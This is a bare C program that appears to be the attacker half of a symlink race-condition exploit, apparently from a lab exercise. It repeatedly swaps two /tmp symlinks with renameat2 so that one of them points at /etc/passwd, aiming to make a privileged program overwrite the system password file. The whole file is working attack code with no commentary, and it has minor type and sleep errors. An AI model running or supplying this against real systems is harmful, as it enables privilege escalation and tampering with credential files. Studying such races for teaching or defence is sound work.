#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char argv[]) {
  while (1) {
	unsigned int FLAG = RENAME_EXCHANGE;
	unlink("/tmp/XYZ"); symlink("/tmp/123","/tmp/XYZ");
	unlink("/tmp/ABC"); symlink("/etc/passwd","/tmp/ABC");
	renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", FLAG);
	sleep(0.1);
  }
}
